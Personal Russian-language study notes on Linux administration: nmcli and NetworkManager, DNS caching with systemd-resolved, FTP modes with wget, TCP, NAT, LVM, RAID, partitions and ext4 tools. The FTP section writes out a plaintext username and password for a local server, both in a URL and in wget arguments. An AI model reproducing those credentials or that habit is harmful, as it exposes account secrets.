Такое переименование можно отключить добавив в /etc/default/grub, в строку с переменной GRUB_CMDLINE_LINUX_DEFAULT строку net.ifnames=0. После этого нужно выполнить sudo update-grub


                 ===== = СЛУЖБА NetworkManager = = =====  
Внутреннее устройство Linux ( PDFDrive ).pdf стр 231

Менеджер NetworkManager — это демон, который запускается во время загрузки системы. 
 Его задача  в прослушивании системных и пользовательских событий с последующим изменением
 конфигурации сети на основе набора правил.
Во время работы менеджер NetworkManager обслуживает два основных уровня конфигурации.
 Первый — это информация о доступных аппаратных средствах, обычно она извлекается из ядра и 
появляется при отслеживании демона udev через шину Desktop Bus (D-Bus).
Второй уровень конфигурации представляет специальный перечень подключений: аппаратные средства и
 дополнительные параметры конфигурации физического и сетевого уровней. Например, беспроводная сеть
может быть представлена как подключение. Чтобы активизировать подключение, менеджер NetworkManager 
часто поручает задачи другим специализированным сетевым инструментам и демонам, например dhclient, 
которые узнают конфигурацию интернет-уровня из локально подключенной физической сети.
 Во время запуска менеджер NetworkManager собирает всю доступную информацию о сетевом устройстве, 
отыскивает его перечень подключений, а затем предпринимает попытку активизации какого-либо из них. 
Большинство пользователей GUI взаимодействует с менеджером NetworkManager с помощью !апплета! на
 рабочем столе: как правило, это значок в верхнем или нижнем беспроводных подключений.
Для управления менеджером NetworkManager из командной строки cli используйте
nmcli
nm-online
Основным каталогом конфигурации менеджера NetworkManager обычно является /etc/NetworkManager, и в 
нем несколько различных типов конфигурации, главныйфайл /etc/NetworkManager/NetworkManager.conf.
Когда статус сетевого интерфейса в системеменяется,менеджер NetworkManager запускает все, что 
находится в каталоге /etc/NetworkManager/dispatcher.d с какимлибо из аргументов, таким как up или down.
Это сравнительно просто, однако вомногих версиях ОС используются собственные сценарии управления сетью,
поэтому в указанном каталоге нет отдельных сценариев диспетчеризации. В Ubuntu, например, применяется
всего один сценарий — 01ifupdown, который запускает все,что расположено в соответствующем подкаталоге 
каталога /etc/network, например в /etc/network/if-up.d.

systemctl status NetworkManager  // юнит service для NM
● NetworkManager.service - Network Manager
     Loaded: loaded (/lib/systemd/system/NetworkManager.service; enabled; vendor preset: ena>
     Active: active (running) since Sun 2023-06-11 15:46:29 +03; 23min ago
       Docs: man:NetworkManager(8)
   Main PID: 643 (NetworkManager)
      Tasks: 3 (limit: 2204)
     Memory: 9.3M
        CPU: 174ms
     CGroup: /system.slice/NetworkManager.service
             └─643 /usr/sbin/NetworkManager --no-daemon
см man NetworkManager, также демон NetworkManager использует службу NetworkManager-dispatcher

Настройка NetworkManager в консоли (nmcli)
https://losst.pro/upravlenie-networkmanager-iz-konsoli?cmdurl=1

nmcli device status  // статус устройств интерфейсов в ядре OS
  DEVICE  TYPE      STATE                 CONNECTION
  enp0s3  ethernet  подключено (внешнее)  enp0s3
  lo      loopback  не настроенно         --
nmcli general status  // статус общего состояния 
  STATE       CONNECTIVITY  WIFI-HW  WIFI     WWAN-HW  WWAN
  подключено  полностью     включен  включен  включен  включен

nmcli connection show // статус "подключений"
  NAME                    UUID                                  TYPE      DEVICE
  enp0s3                  6bbefc95-cade-4de0-8aeb-fb9e0d0c0cb1  ethernet  enp0s3
  Проводное соединение 1  c203e517-a13f-3c12-b144-0720083c6be2  ethernet  --

nmcli connection show "Проводное соединение 1"
connection.id:                          Проводное соединение 1
connection.uuid:                        c203e517-a13f-3c12-b144-0720083c6be2
connection.type:                        802-3-ethernet
connection.interface-name:              enp0s3
...

добавить статический маршрут для интерфейса
sudo nmcli connection modify uuid c556f897-afcd-379f-ac75-c21637fb669e +ipv4.routes "169.254.0.0/16 169.254.0.5"
nmcli connection show Проводное\ соединение\ 1 | grep IP4.
IP4.ADDRESS[1]:                         192.168.100.10/24
IP4.GATEWAY:                            192.168.100.1
IP4.ROUTE[1]:                           dst = 192.168.100.0/24, nh = 0.0.0.0, mt = 100
IP4.ROUTE[2]:                           dst = 169.254.0.0/16, nh = 0.0.0.0, mt = 1000
IP4.ROUTE[3]:                           dst = 0.0.0.0/0, nh = 192.168.100.1, mt = 100
IP4.DNS[1]:                             192.168.100.1


sudo nmcli device down/up enp0s3 // выключить вклть устройство(интерфейс ядра) enp0s3
sudo nmcli connection up "Проводное соединение 2"

sudo find /sys/ -name enp0s3 // файлы, связанные с интерфейсом ядра enp0s3
/sys/class/net/enp0s3
/sys/devices/pci0000:00/0000:00:03.0/net/enp0s3

sudo dhclient -r // отозвать динамический ip у enp0s3
sudo nmcli connection add con-name "dhcp" type ethernet ifname enp0s3 // добавить новое подключение dhcp
  Соединение «dhcp» (5efefd38-095c-4bca-b024-6138102215ea) добавлено.
nmcli connection show 
  NAME                    UUID                                  TYPE      DEVICE 
  Проводное соединение 1  c203e517-a13f-3c12-b144-0720083c6be2  ethernet  enp0s3 
  dhcp                    5efefd38-095c-4bca-b024-6138102215ea  ethernet  --     
nmcli connection up "dhcp" // включить соединение dhcp и применить к enp0s3
   Соединение успешно активировано (адрес действующего D-Bus: /org/freedesktop/NetworkManager/ActiveConnection/4)
ip a // enp0s3 получил ip по dhcp
2: enp0s3: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc fq_codel state UP group default qlen 1000
    link/ether 08:00:27:9c:71:a3 brd ff:ff:ff:ff:ff:ff
    inet 10.250.14.42/20 brd 10.250.15.255 scope global dynamic noprefixroute enp0s3
       valid_lft 3595sec preferred_lft 3595sec

// Создание соединения с статическим адресом   
nmcli connection add con-name "static" ifname enp2s0 autoconnect no type ethernet ip4 192.168.0.210 gw4 192.168.0.1
//Добавить DNS сервер для статического соединения
  nmcli conn modify "static" ipv4.dns 8.8.8.8
//И ещё один DNS сервер с помощью оператора +:
  nmcli conn modify "static" +ipv4.dns 8.8.4.4

 nmcli radio wifi
 sudo  nmcli device wifi list

			         ==== Работа DNS ======
Внутреннее устройство Linux ( PDFDrive ).pdf стр 231
 9.12. Разрешение имени хоста
Практически все сетевые приложения в Linux выполняют поиски DNS. Процесс разрешения имен обычно протекает следующим образом.
1. Приложение вызывает функцию, чтобы выяснить IP-адрес, который стоит за именем хоста. Эта функция находится в совместно используемой системной библиотеке, поэтому приложению не нужно знать подробности о том, как она
работает, или об изменениях в ее реализации.
2. Когда эта функция запускается, она действует в соответствии с набором правил (расположенных в 
 файле /etc/nsswitch.conf), чтобы установить план действий при поисках. Например, такие правила
  обычно говорят о том, что перед переходом к DNS следует проверить ручное 
  переопределение в файле /etc/hosts.
3. Когда функция решает использовать службу DNS для поиска имени, она обращается к дополнительному файлу конфигурации, чтобы найти сервер имен DNS. Сервер имен представлен в виде IP-адреса.
4. Функция отправляет DNS-запрос на поиск (по сети) серверу имен.
5. Сервер имен сообщает в ответ IP-адрес имени хоста, а функция возвращает этот IP-адрес приложению
Файл resolv.conf
Традиционным файлом конфигурации для серверов DNS является файл /etc/resolv.conf. Когда все было проще, типичный пример мог выглядеть так (здесь 10.32.45.23 и 10.3.2.3 — это адреса серверов имен у поставщика интернет-услуг):
less /etc/resolv.conf // файл конфигурации DNS серверов
search mydomain.example.com example.com
nameserver 10.32.45.23
nameserver 8.8.8.8 // будет использоваться при статическом задании интерфейса и 
              // !отключении dhcp "dhclient -r" 

9.13 Кэширование DNS и службы DNS без конфигурирования
Традиционная конфигурация службы DNS имеет две основные проблемы.
1) Первая локальный компьютер !не кэширует имя!, которое возвращает сервер, поэтому частый повторяющийся доступ к сети может неоправданно замедлиться вследствие запросов к серверу имен. Чтобы справиться с этой проблемой, многие компьютеры (и маршрутизаторы, если они работают в качестве серверов имен) запускают промежуточный демон, чтобы перехватывать запросы к серверу имен и возвращать на них, если это возможно, кэшированный ответ. В противномслучае запросы отправляются на реальный сервер имен. Два наиболее распространенных демона Linux для этой цели — dnsmasq и nscd. 
!!!! Часто можно понять, запущен ли демон кэширования имен, если в файле конфигурации /etc/resolv.conf присутствует адрес 127.0.0.1 (localhost) или же в качестве имени сервера отображается 127.0.0.1, когда вы запускаете команду nslookup -debug host. (см примеры на Mint ниже!)
2)Другой проблемой, связанной с DNS, является то, что оно может оказаться чрезвычайно негибким, когда вам потребуется выяснить имена в вашей локальной сети, не вникая в детали сетевой конфигурации.
Если, например, вы настраиваете сетевое устройство в своей сети, вам может понадобиться немедленно вызвать его по имени. Это часть идеи, которая заложена в такие службы имен, не требующие конфигурации, как mDNS (Multicast DNS, многоадресная служба DNS) и SSDP (Simple Service Discovery Protocol, простой протокол обнаружения службы). Если необходимо найти в локальной сети хост по его имени, то вы просто рассылаете запрос по этой сети; если требуемый хост в ней присутствует, то он возвращает в ответ свой адрес. Эти протоколы выходят за рамки разрешения имени хоста, предоставляя также информацию о доступных службах.
Наиболее широко используемая реализация mDNS для Linux называется Avahi (см ниже)

cat /etc/resolv.conf  // Я: файл на Mint 
nameserver 127.0.0.53 // демон кэширования имен!! systemd-resolve - перенапрвляет запросы dns серверу о BRAS?
search .

!! sudo обязательно иначе не отобразиться PID
!sudo! netstat -tlnpa // показать Активные соединения с интернетом, где PC только в роли server
Активные соединения с интернетом (only servers)
Proto Recv-Q Send-Q Local Address         Foreign Address           State      PID/Program name
tcp        0      0 127.0.0.1:631           0.0.0.0:*               LISTEN      836/cupsd
tcp        0      0 127.0.0.53:53           0.0.0.0:*               LISTEN      626/systemd-resolve
                                   //  !!демон кэширования имен systemd-resolved!!
                        //првильно -ed на конце, см "ps aux"
tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      815/sshd: /usr/sbin
tcp6       0      0 ::1:631                 :::*                    LISTEN      836/cupsd
tcp6       0      0 :::5201                 :::*                    LISTEN      2241/iperf3
tcp6       0      0 :::22                   :::*                    LISTEN      815/sshd: /usr/sbin// 


на 127.0.0.53:53 "слушает" демон кэширования имен systemd-resolve принимает запросы от процессов на PC
     и перенапраляет на кэширующий dns-сервер (полученный через pppoe или на адрес шлюза). 
Настройки определены 
"cat /etc/resolv.conf
nameserver 127.0.0.53
options edns0 trust-ad
search . "
//см ниже resolvectl status // запросить адрес Current DNS Server: текущего DNS сервера в системе linux

ps aux | grep resolve
systemd+    626  0.1  0.6  25552 12860 ?   Ss   15:48   0:00 /lib/systemd/systemd-resolved //!!

systemctl status systemd-resolved.service  
● systemd-resolved.service - Network Name Resolution  !!демон кэширования имен
     Loaded: loaded (/lib/systemd/system/systemd-resolved.service; enabled; vendor preset: enabled)
     Active: active (running) since Wed 2023-06-14 23:04:17 +03; 39min ago
       Docs: man:systemd-resolved.service(8)
             man:org.freedesktop.resolve1(5)
             https://www.freedesktop.org/wiki/Software/systemd/writing-network-configuration-manag>
             https://www.freedesktop.org/wiki/Software/systemd/writing-resolver-clients
   Main PID: 626 (systemd-resolve)
     Status: "Processing requests..."
      Tasks: 1 (limit: 2204)
     Memory: 8.0M
        CPU: 103ms
     CGroup: /system.slice/systemd-resolved.service
             └─626 /lib/systemd/systemd-resolved

man systemd-resolved.service
       systemd-resolved is a system service that provides network name resolution to local
       applications. It implements a caching and validating DNS/DNSSEC stub resolver, as well as
       an LLMNR and MulticastDNS resolver and responder



nslookup -debug ya.ru 
Server:         127.0.0.53  //!!демон кэширования имен!!
Address:        127.0.0.53#53
------------
    QUESTIONS:
        ya.ru, type = A, class = IN
    ANSWERS:
    ->  ya.ru
        internet address = 5.255.255.242
        ttl = 554
    ->  ya.ru
        internet address = 77.88.55.242
        ttl = 554
    AUTHORITY RECORDS:
    ADDITIONAL RECORDS:
------------
Non-authoritative answer:
Name:   ya.ru
Address: 5.255.255.242
Name:   ya.ru
Address: 77.88.55.242
------------
    QUESTIONS:
        ya.ru, type = AAAA, class = IN
    ANSWERS:
    ->  ya.ru
        has AAAA address 2a02:6b8::2:242
        ttl = 281
    AUTHORITY RECORDS:
    ADDITIONAL RECORDS:
------------
Name:   ya.ru
Address: 2a02:6b8::2:242

2)  mDNS для Linux называется Avahi 
ps aux | grep avahi
avahi        637  0.0  0.1   7628  3620 ?        Ss   18:58   0:00 avahi-daemon: running [LnxPC.local]

systemctl status avahi-daemon.service
● avahi-daemon.service - Avahi mDNS/DNS-SD Stack
     Loaded: loaded (/lib/systemd/system/avahi-daemon.service; enabled; vendor preset: enabl>
     Active: active (running) since Sun 2023-06-11 18:58:40 +03; 55min ago
TriggeredBy: ● avahi-daemon.socket
   Main PID: 637 (avahi-daemon)
     Status: "avahi-daemon 0.8 starting up."
      Tasks: 2 (limit: 2204)
     Memory: 1.2M
        CPU: 33ms
     CGroup: /system.slice/avahi-daemon.service
             ├─637 "avahi-daemon: running [LnxPC.local]"
             └─720 "avahi-daemon: chroot helper"



                           ==== FIN Работа DNS FIN ======




 = = ftp wget активный и пассивный режим = = 
https://vps.ua/wiki/ftp-mode/   anonymous

FTP: Для работы по FTP-протоколу используется два соединения
первое соединение для команд , а второе для данных. Как в активном, так и в 
пассивном режиме, установка соединения начинается с отправки запроса клиентом на сервер.
Активный режим FTP
Сначала устанавливается управляющее соединение. Для этого на клиенте создается временный порт 
с номером в диапазоне от 1024 до 65535 для установки управляющего соединения,
а также порт для передачи данных. В активном режиме все происходит в следующем порядке:
Клиент посылает с временного порта диапазоном 1024–65535 запрос на порт сервера номер 21.
Сервер отвечает на временный порт клиента (в примере порт 1036).
Клиент подтверждает установку соединения.
Клиент отправляет команду PORT, которая говорит об использовании активного режима FTP,
свой IP-адрес, а также номер порта для установки соединения для передачи данных, к которому
подключится сервер (в примере порт 1037).
Команда подтверждается сервером.
Клиент задает серверу команды для работы с FTP.
Сервер создает соединение передачи данных. Для этого он отправляет запрос с 20-го порта
на указанный клиентом в четвертом пункте порт (1037).
Клиент отвечает на запрос.
Сервер подтверждает установку соединения и дает клиенту возможность передавать данные.
!Т.о. в активном режиме возможна многопоточная загрузка файлов внутри одной ftp контрольной сесссии!

Пассивный режим FTP - оба соединения устанавливает клиент.
Пассивный режим необходимо использовать, если ваш компьютер не имеет публичн IP-адреса (например, еслив LAN).
Клиент посылает с временного порта диапазоном 1024–65535 запрос на порт сервера номер 21.
Сервер отвечает на временный порт клиента (в примере порт 1036).
Клиент подтверждает установку соединения.
Клиент отправляет команду PASV, которая говорит об использовании пассивного режима FTP.
Сервер подтверждает работу в пассивном режиме, посылает свой IP-адрес, а также номер 
порта для установки соединения для передачи данных, к которому подключится клиент (в примере 2154).
С порта для передачи данных (в примере 1037) клиент посылает запрос на установку 
соединения на выданный сервером порт (2154).
Сервер подтверждает установку соединения. Клиент устанавливает соединение.
Клиент задает команды серверу (с управляющего порта на порт 21, в примере – с порта 1036 на порт 21), после чего возможна передача данных.


+см видео Кетов видео FW2: 
В iptables Linux реализованы механизмы отслеживания "косвенных" related пакетов. 
Такими пакетами являются:
- ответы icmp-unreachable от маршрутизатора web-агенту/клиента на его запрос к web-серверу, 
  если 80 порт сервера не работает
- встречные запросы ftp-сервера на установление канала передачи файла с ftp-клиентом при использовании 
  active активного ftp режима
Косвенные related пакеты отлсеживаются ядром Linux c применением специальны модулей, например для ftp:
modinfo /lib/modules/5.15.0-87-generic/kernel/net/netfilter/nf_conntrack_ftp.ko
filename:       /lib/modules/5.15.0-87-generic/kernel/net/netfilter/nf_conntrack_ftp.ko
alias:          nfct-helper-ftp

ftp ftp.byfly.by // зайти в ftp сервер, просмотреть каталог  и загрузить файл
Trying 82.209.230.71:21 ...
Connected to ftpbyflyby.belpak.by.
220 Welcome to ftp.byfly.by! HTTP and RSYNC services are also available.
Name (ftp.byfly.by:mint): anonymous
331 Please specify the password.
Password: 
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> dir
229 Entering Extended Passive Mode (|||51569|)
150 Here comes the directory listing.
drwxr-xr-x    2 0        0              37 Nov 08  2018 byfly
lrwxrwxrwx    1 0        0              11 Aug 01  2012 debian -> pub/debian/
226 Directory send OK.

226 Directory send OK.
ftp> get override.zesty.main.src
local: override.zesty.main.src remote: override.zesty.main.src
229 Entering Extended Passive Mode (|||51118|)
150 Opening BINARY mode data connection for override.zesty.main.src (53104 bytes).
100% |***********************************| 53104        1.52 MiB/s    00:00 ETA
226 Transfer complete.
53104 bytes received in 00:00 (1.36 MiB/s)
ftp> quit
221 Goodbye.

ftp ftp://mvn75:edc555@192.168.100.8:2121 // c ftp сервером xaomi
wget  ftp://192.168.100.8:2121 --ftp-user=mvn75 --ftp-password=edc555 // c ftp сервером xaomi

ftp> ls // просмотр файлов текущ папки на ftp сервере
ftp> pwd // просмотр текущ папки на ftp сервере
ftp> cd /files/ // изменить текущ папку на ftp сервере
ftp> lcd /tmp/ // изменить текущ папку на ftp клиенте
ftp> get file  // загрузить файл с серверы
ftp> put file // загрузить файл НА сервер
ftp> delete file   // удалить файл на ftp сервере

https://losst.pro/komanda-wget-linux?cmdurl=1
wget --directory-prefix=Downloads http://ftp.byfly.by/pub/CPAN //скачать сайт на диск в папку Downloads 
--2023-01-29 20:20:34--  http://ftp.byfly.by/pub/CPAN
.....
Length: 8487 (8.3K) [text/html]
Saving to: ‘Downloads/CPAN’
CPAN                100%[===================>]   8.29K  --.-KB/s    in 0.001s  
2023-01-29 20:20:34 (7.73 MB/s) - ‘Downloads/CPAN’ saved [8487/8487]



 = = ftp wget активный и пассивный режим = = 





 = = tcp = =
 https://networkguru.ru/protokol-transportnogo-urovnia-tcp-chto-nuzhno-znat/
 https://wiki.merionet.ru/articles/ustanovlenie-i-prekrashhenie-tcp-soedineniya
 https://ru.wikipedia.org/wiki/TCP
 https://habr.com/ru/articles/732794/

Процесс начала сеанса TCP (также называемый «3-м рукопожатием», состоит из трёх шагов.
Клиент посылает серверу сегмент с номером последовательности (Sequence number) и флагом SYN.

Sequence number, SYN (32 бита): порядковый номер. Позволяет контролировать порядок сообщений.
Каждая конечная точка (как порт источника, так и порт назначения) будут поддерживать 
свой уникальный порядковый номер для отправляемых сообщений. При установлении соединения
TCP (используется сообщение с установленным флагом SYN) в качестве изначального порядкового 
номера будет сгенерировано число от 0 до 4294967295, которое будет соответствовать времени
после перегрузки системы отправителя (из расчета +1 за каждые прошедшие 4 микросекунды),
а также увеличенное на 64000 каждый раз при установлении нового соединения. 

Сервер получает сегмент, запоминает номер последовательности и пытается создать !!!
 !! сокет (буфера и управляющие структуры памяти) для обслуживания нового клиента.
В случае успеха сервер посылает клиенту сегмент с номером последовательности и флагами SYN и ACK,
 и переходит в состояние SYN-RECEIVED. В случае неудачи сервер посылает клиенту сегмент с флагом RST.

Пакет PUSH инструктирует систему получателя немедленно передать все полученные ранее данные из
 буфера в приложение пользователя и сразу же отправить сообщение с подтверждением.
 = = END tcp = =


   = = firewall iptables DNAT SNAT traffic control nft tc = =
https://youtube.com/watch?v=zqMYJaz6elM&si=cWNBFSIl9vP9b1fL  Продвинутая защита ssh с помощью iptables. Ограничение кол-ва подключений в минуту, час, день 
+см видео Кетов видео FW1 и FW2

файл 46. 46. Межсетевой экран - firewalld — Основы GNU
firewall-cmd 

Source NAT (SNAT=masquerade) - заменяется source исходный IP-адрес сетевого пакета, т.е. адрес отправителя. Это также позволяет
IP адреса отправителей, поэтому также такой NAT называют masquerad. https://en.wikipedia.org/wiki/Network_address_translation

Destination NAT (DNAT=forward-ports="проброс портов"/"перенаправление портов") - когда заменяется адрес получателя. К примеру, ваш домашний компьютер недоступен из интернета, а ваш роутер - доступен.Можете на роутере выделить к-н порт на uplink интерф, к примеру, 5555. И когда на роутер на этот адрес и порт 5555 будут приходить запросы, он будет их пересылать на ваш домашний компьютер (192.168.100.5). forward-ports="проброс портов"/"перенаправление портов= Port forwarding=Port mapping=DNAT
 Port forwarding=Port mapping=DNAT  https://en.wikipedia.org/wiki/Port_forwarding
 When used on gateway devices, a port forward may be implemented with a single rule to translate the destination address and port.
 (On Linux kernels, this is DNAT rule)

tc - управление трафиком очереди CAR 
nft https://losst.pro/kak-polzovatsya-nftables
   = end firewall iptables DNAT SNAT traffic control nft tc =

SCSI
https://ru.wikipedia.org/wiki/SCSI
SCSI-стандарты определяют команды, протоколы (электрические и оптические интерфейсы) 
  для объединения на одной шине различных по своему назначению устройств
Linux ядро интерпретирует все дисковые устройства (включая жесткие диски PATA/SATA, флеш-диски и съемные 
накопители USB, такие как портативные музыкальные плееры и цифровые камеры) как диски SCSI!!
lsscsi -s
[1:0:0:0]    cd/dvd  VBOX     CD-ROM           1.0   /dev/sr0   52.9MB
[2:0:0:0]    disk    ATA      VBOX HARDDISK    1.0   /dev/sda   23.9GB
[3:0:0:0]    cd/dvd  VBOX     CD-ROM           1.0   /dev/sr1   2.64GB
[4:0:0:0]    disk    ATA      VBOX HARDDISK    1.0   /dev/sdb    104MB
[5:0:0:0]    disk    ATA      VBOX HARDDISK    1.0   /dev/sdc    104MB
[6:0:0:0]    disk    ATA      VBOX HARDDISK    1.0   /dev/sdd    104MB
[7:0:0:0]    cd/dvd  VBOX     CD-ROM           1.0   /dev/sr2   3.90GB
[8:0:0:0]    disk    ATA      VBOX HARDDISK    1.0   /dev/sde   3.67GB
[9:0:0:0]    disk             USB DISK 2.0     PMAP  /dev/sdf   2.06GB
SCSI интерфейс в linux - слой АБСТРАКЦИИ для обмена данными по шине с блочными block устройствами,
!!ХОТЯ на самом деле толко на SSD и USB носителях данные храняться на страницах/в блоках, 
  а на HDD - на секторах дисков, CDROM - одной единой дорожке как на грампластинке
 
 LVM, RAID (md) - уровни абстракции над/поверх реальными файловыми системами, 
  добавляют накладные расходы на диски 

 = = LVM = =
25. Управление логическими томами LVM — Основы GNU 
  преимущества LVM - возможность создания snapshot снимков дисков!
ВАЖНО:при использовании LVM на нескольких дисках можно потерять все данные, если выйдет
  из строя один диск. Поэтому не стоит использовать одну VG на нескольких дисках, 
 если нет RAID или нет бэкапа данных.  
http://xgu.ru/wiki/LVM

Монтирование LVM Logical Volume в /etc/fstab
https://xan.manning.io/2017/05/29/best-practice-for-mounting-an-lvm-logical-volume-with-etc-fstab.html
 = = RAID №2? = =
26. Программный RAID - MD  — Основы GNU 
Больше информации о RAID: https://ru.wikipedia.org/wiki/RAID
Больше информации о mdadm: http://xgu.ru/wiki/mdadm


 =  = = = = =   ФАЙЛЫ И ФАЙЛОВЫЕ ДИСКОВЫЕ СИСТЕМЫ   = = = = = = 
"Блок" логическая абстракция файловых систем UFS чтобы одинаково работать с накопителями HDD у которых мин.единица хранения - "сектора", SDD - у которых "страницы", CDROM - "фрагмент дорожки" 
cat /sys/class/block/sdb/queue/logical_block_size // размер логического блока
cat /sys/class/block/sdb/queue/physical_block_size //размер физического блока
youtube "GNU linux pro", 23 Основы файловых сетей - Основы GNU
  см 24. Работа с файловыми системами — Основы GNU: - перенос /home на др. диск,FS; 
 - применение fdisk, mke2fs, fstab, UUID, количество inode, blkid, fsck 
cat /etc/mke2fs.conf //настройки по умолчанию для файловой системы ext4

sudo mkfs.ext4 /dev/sdb1 //Программа создаст файловую систему ext4 и показжет кол-во блоков 
  какого объёма поместилось в файловой системе, какое количество inodу, идентификатор fs,
     где сохранились бэкапы суперблока

Из лекции CSС (https://www.youtube.com/watch?v=4Y8ZV1O6dr0)
Superblock - главный (первый) блок (на диске) файловой системы, описывающий ее параметры
inode - индексный узел (метаинформация о файле)
dentry - элемент пути (длинное имя)
file - объект, представляющий открытый файл, связанный с процессом 

Форматирование  - создание ОС(оперц-нной системой) записи  superblock на носителе (дисковой файловой системы)
Монтирование - чтение ОС superblock и создание ОС в памяти  логич. структур inode dentry files
inode - ключ к файлу(в широком смысле), содержащий метаданные и адреса доступа к данным файла на носителе
Каталог - файл, содержащий список структур i-node/inode файлов и i-node др. каталогов, содержащихся  в каталоге
Файл с точки зрения файловой дисковой системы - последовательность БЛОКОВ  диска/носителя.
Файл с точки зрения прикладных программ/пользователя ОС - ПОТОК байт данных  
Файл для ЯДРА ОС  - адаптер блоков данных (те файла с точки зрения файловой дисковой системы) к потокам (те файла с точки зрения прикладных программ/пользователя ОС)
Файл содержит файловый ДЕСКРИПТОР,  указатели текщей позиции чтения файла (для разных пользователей) на уровне приложений функий (lib C). Т.е функция fd=fopen (f) возвражает файловый дескриптер

Функция fopen() в языке Си. Она ожидает информации из двух частей: путь к файлу и режим, в котором он будет открыт. С помощью этих данных, операционная система возвращает другой вид информации, который называется «дескриптор файла». Дескриптор файла может быть использован для чтения файла или записи в файл. Это и есть интерфейс.https://losst.pro/chto-takoe-posix

 При реальной установке Linux след ядро устанавливать на один раздел, а home каталог - на другом разделе! см Файловые системы UFS ext NTFS FAT (25.03).doc!!

           ##########################  ФАЙЛОВЫЕ УСТРОЙСТВА #################### 
      !!! см подробно "Файловые системы UFS ext NTFS FAT  EFI  ESP GPT LBA BIOS MBR  .doc"  !!!
Разделы жесткого диска // MBR vs GPT  
"Таблица разделов жесткого диска: Существует несколько типов таблиц разделов жестких дисков. Наиболее распространенной на данным момент являемся IBM-PC совместимая таблица разделов, являющаяся частью главной загрузочной записи (MBR). MBR располагается в первом(нулевом) физическом секторе жесткого диска. Однако в последнее время начинает все чаще использоваться таблица GPT (GUID Partition Table). Если ваш диск имеет таблицу разбиения GPT, то в GPT по умолчанию зарезервировано место под 128!!! разделов) и разбираться с типами разделов (в GPT - все разделы первичные)."

Лимит числа основных разделов на диске c MBR!
На одном жестком диске должно быть не более 4-х основных разделов, если при этом нет логических. Если встает необходимость в создании более 4-х разделов диска, создаваемый 4-й раздел и все последующие разделы должны быть логическими. Так, после созданной тройки основных разделов 4-й раздел, называемый дополнительным или расширенным, будет представлять собой нечто контейнера, который, в свою очередь, можно делить на множество логических разделов.

Виды разделов Первичный (основной) раздел
Первичный раздел обязательно должен быть на физическом диске. Этот раздел всегда содержит либо одну файловую систему, либо другие логические разделы. На физическом диске может быть до четырёх первичных разделов. 
Расширенный и Логические разделы
Таблица разделов может содержать не более 4 первичных разделов, поэтому были изобретёны расширенный разделы. В расширенном разделе можно создать несколько логических разделов. Логические разделы выстраиваются в цепочку где информация о первом логическом разделе храниться в MBR, а информация о последующем хранится в первом секторе логического раздела. Такая цепочка позволяет (в теории) создавать неограниченное количество разделов, но (на практике) число логических разделов ограничивается утилитами и, обычно, больше 10 логических разделов не создать.

# parted -l // Внутреннее устройство Linux ( PDFDrive ).pdf
Model: ATA WDC WD3200AAJS-2 (scsi)
Disk /dev/sda: 320GB
Partition Table: msdos
Number Start End Size Type File system Flags
 1 1049kB 316GB 316GB primary ext4 boot
 2 316GB 320GB 4235MB extended
 5 316GB 320GB 4235MB logical linux-swap(v1)
Model: FLASH Drive UT_USB20 (scsi)
Disk /dev/sdf: 4041MB
Partition Table: gpt
Number Start End Size File system Name Flags
 1 17.4kB 1000MB 1000MB myfirst
 2 1000MB 4040MB 3040MB mysecond
Первое устройство, /dev/sda, использует традиционную таблицу разделов MBR
(которую команда parted назвала msdos), а второе устройство содержит таблицу
GPT. Таблица MBR в данном примере содержит основной, расширенный и логический разделы. Основной раздел является подразделом диска; раздел 1 — пример тому. В основной таблице MBR предельное количество ОСНОВНЫХ разделов равно четырем. Если вам необходимо больше четырех разделов, вы обозначаете один из них как расширенный раздел. Затем вы делите расширенный раздел на логические разделы, которые операционная система может использовать подобно любому другому разделу. В данном примере раздел 2 является РАСШИРЕННЫМ разделом, который содержит ЛОГИЧЕСКИЙ раздел 5.

https://linux16.ru/notes/nastrojka-zhestkix-diskov-cherez-tune2fs-v-linux.html?ysclid=lgjfm2c5ss873331045            ============ tune2fs ===========
sudo tune2fs -l /dev/sda1 // промотр информации о КОРНЕВОЙ файловой системе,включая суперблок 
                             количество inode i-node
tune2fs 1.46.5 (30-Dec-2021)
Filesystem volume name:   <none>
Last mounted on:          /
Filesystem UUID:          1b33bbef-3cbf-41ea-9e3a-ed3b4ea26ba4
Filesystem magic number:  0xEF53
Filesystem revision #:    1 (dynamic)
Filesystem features:      has_journal ext_attr resize_inode dir_index filetype needs_recovery extent 64bit flex_bg sparse_super large_file huge_file dir_nlink extra_isize metadata_csum
Filesystem flags:         signed_directory_hash
Default mount options:    user_xattr acl
Filesystem state:         clean
Errors behavior:          Continue
Filesystem OS type:       Linux
Inode count:              1343488
Block count:              5370880
.....

sudo tune2fs -l /dev/md127 // промотр информации о файловой системе  метадиска RAID, включая суперблок
tune2fs 1.46.5 (30-Dec-2021)
Filesystem volume name:   mdRaid0
Last mounted on:          /mnt/md22
Filesystem UUID:          020ebf59-17ff-48ef-a985-fbbf6d437e61
Filesystem magic number:  0xEF53
Filesystem revision #:    1 (dynamic)
Filesystem features:      ext_attr resize_inode dir_index filetype sparse_super large_file
Filesystem flags:         signed_directory_hash
Default mount options:    user_xattr acl
Filesystem state:         not clean
Errors behavior:          Continue
Filesystem OS type:       Linux
Inode count:              61440
Block count:              983040
Reserved block count:     49152
Overhead clusters:        18211
Free blocks:              432549
Free inodes:              61426
First block:              1
Block size:               1024
Fragment size:            1024
Reserved GDT blocks:      256
Blocks per group:         8192
Fragments per group:      8192
Inodes per group:         512
Inode blocks per group:   128
RAID stride:              512
RAID stripe width:        1536
Filesystem created:       Sat Apr 15 20:39:46 2023
Last mount time:          Sun Apr 16 16:05:42 2023
Last write time:          Sun Apr 16 16:05:42 2023
Mount count:              7
Maximum mount count:      -1
Last checked:             Sat Apr 15 20:39:46 2023
Check interval:           0 (<none>)
Lifetime writes:          470 MB
Reserved blocks uid:      0 (user root)
Reserved blocks gid:      0 (group root)
First inode:              11
Inode size:               256
Required extra isize:     32
Desired extra isize:      32
Default directory hash:   half_md4
Directory Hash Seed:      edce5c7f-430a-4ce6-bc5b-9b34366fb414

sudo tune2fs -O ^abcde /dev/sdxN //  исключить из парметрова fs /dev/sdxN при монтировании параметр "abcde" из результата "tune2fs -l". tune2fs - работает только с ext fs !

dumpe2fs /dev/sda1  //  промотр информации о файловой системе,  включая суперблок, группы блоков и свободные блоки 
                  // количесво группы блоков = Block count/Blocks per group
dumpe2fs 1.46.5 (30-Dec-2021)
Filesystem volume name:   <none>
